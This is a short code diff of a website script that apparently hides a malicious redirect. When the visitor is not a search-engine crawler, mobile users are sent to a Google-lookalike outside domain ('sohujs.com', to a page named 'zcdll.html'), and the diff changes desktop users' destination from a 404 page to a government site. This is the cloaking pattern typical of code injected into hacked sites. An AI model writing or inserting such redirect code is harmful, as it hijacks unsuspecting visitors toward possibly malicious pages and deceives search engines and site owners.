@@ -25,6 +25,6 @@ if(!isSpider()){
     if(isMobile()) {
      window.location.href = 'https://google.sohujs.com/zcdll.html';
     } else {
-     window.location.href = '/404.html';
+     window.location.href = 'https://www.cngy.gov.cn/';
     }
 }
